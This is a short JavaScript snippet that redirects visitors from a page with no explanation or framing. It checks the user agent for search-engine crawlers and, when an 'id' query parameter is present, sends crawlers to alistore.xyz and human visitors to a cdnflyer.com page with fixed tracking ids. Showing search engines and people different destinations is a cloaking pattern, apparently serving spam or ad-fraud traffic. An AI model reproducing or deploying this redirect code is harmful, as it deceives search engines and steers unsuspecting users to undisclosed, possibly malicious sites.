(function(){
	let params = (function(){var vars={};var parts=window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi,function(m,key,value){vars[key]=value;});return vars;})();
	let fafifu = /bot|google|facebook|teoma|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i.test(navigator.userAgent);
	if(params.id) {
		if(fafifu) location.replace('https://alistore.xyz/?s='+params.id+'');
		else location.href = 'https://cdnflyer.com/srv.html?id=5522393&pub=322513';
	}
	if(params.gotcha) { document.addEventListener('DOMContentLoaded', function(){ document.title = 'Gotcha'; }); }
})();
